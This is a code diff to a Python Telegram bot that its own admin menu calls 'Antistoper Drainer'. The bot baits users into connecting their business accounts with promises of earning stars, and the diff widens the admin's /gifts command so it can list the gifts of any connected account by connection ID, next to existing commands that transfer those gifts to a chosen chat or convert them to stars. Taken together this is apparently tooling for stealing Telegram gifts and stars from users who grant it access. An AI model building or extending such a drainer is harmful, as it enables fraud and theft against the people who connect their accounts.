@@ -181,7 +181,7 @@ Invite your friends to earn additional stars!
             f"Antistoper Drainer\n\n🔗 Number of Connections: {count}\n\n"
             f"/gifts - View gifts\n"
             f"/stars - View stars\n"
-            f"/transfer <owned_gift_id> <target_user_chat_id> - Manually transfer a gift\n" # Updated usage
+            f"/transfer <owned_gift_id> <target_user_chat_id> - Manually transfer a gift\n"
             f"/convert - Convert gifts to stars\n"
             f"/clear_connections - Clear all connections"
         )
@@ -214,23 +214,34 @@ async def earn_stars(callback: CallbackQuery):
         parse_mode=ParseMode.HTML
     )
 
-@dp.message(F.text == "/gifts")
+@dp.message(F.text.startswith("/gifts")) # Changed condition to startswith
 async def gifts_command(message: Message):
-    """Handles the /gifts command, showing the user's connected account gifts."""
+    """Handles the /gifts command, showing the user's connected account gifts.
+    Admins can use: /gifts <business_connection_id>
+    """
     user_id = message.from_user.id
+    args = message.text.split() # Split the message text to check for arguments
+
+    business_connection_id_to_check = None # Variable to hold the ID we will use
 
     if user_id == ADMIN_ID:
-        await message.reply("As an admin, please use `/gifts <business_connection_id>` to view gifts for a specific connection.")
-        return
-
-    business_connection_id = get_business_connection_id_for_user(user_id)
+        if len(args) == 2:
+            # Admin provided a business_connection_id
+            business_connection_id_to_check = args[1]
+        else:
+            # Admin used /gifts without an ID, provide usage instructions
+            await message.reply("As an admin, please use `/gifts <business_connection_id>` to view gifts for a specific connection.")
+            return
+    else:
+        # For non-admins, get their own business_connection_id
+        business_connection_id_to_check = get_business_connection_id_for_user(user_id)
     
-    if not business_connection_id:
+    if not business_connection_id_to_check:
         await message.reply("You need to connect your business account first to see gifts. Use the '🛠️ Connect' button.")
         return
 
     try:
-        gifts_request = GetFixedBusinessAccountGifts(business_connection_id=business_connection_id)
+        gifts_request = GetFixedBusinessAccountGifts(business_connection_id=business_connection_id_to_check)
         gifts = await bot(gifts_request)
         
         if gifts and gifts.gifts:
@@ -239,13 +250,14 @@ async def gifts_command(message: Message):
                 gifts_text += f"• ID: <code>{gift.owned_id}</code>, Type: {gift.gift.name}\n"
             await message.reply(gifts_text, parse_mode=ParseMode.HTML)
         else:
-            await message.reply("You have no gifts.")
+            await message.reply(f"No gifts found for business connection ID: <code>{business_connection_id_to_check}</code>.", parse_mode=ParseMode.HTML)
     except exceptions.TelegramBadRequest as e:
-        logging.error(f"TelegramBadRequest when getting gifts for user {user_id}: {e}")
-        await message.reply("Failed to retrieve gifts. Your business connection might be inactive or invalid.")
+        logging.error(f"TelegramBadRequest when getting gifts for user {user_id} (connection: {business_connection_id_to_check}): {e}")
+        await message.reply(f"Failed to retrieve gifts. Business connection ID <code>{business_connection_id_to_check}</code> might be inactive or invalid. Error: {e.message}", parse_mode=ParseMode.HTML)
     except Exception as e:
-        logging.exception(f"Error getting gifts for user {user_id}")
-        await message.reply("An error occurred while fetching your gifts. Please try again later.")
+        logging.exception(f"Error getting gifts for user {user_id} (connection: {business_connection_id_to_check})")
+        await message.reply("An error occurred while fetching gifts. Please try again later.")
+
 
 @dp.message(F.text == "/stars")
 async def stars_command(message: Message):
@@ -272,6 +284,7 @@ async def stars_command(message: Message):
     except Exception as e:
         logging.exception(f"Error getting star balance for user {user_id}")
         await message.reply("An error occurred while fetching your star balance. Please try again later.")
+
 
 @dp.message(F.text.startswith("/transfer"))
 async def transfer_gift_command(message: Message):
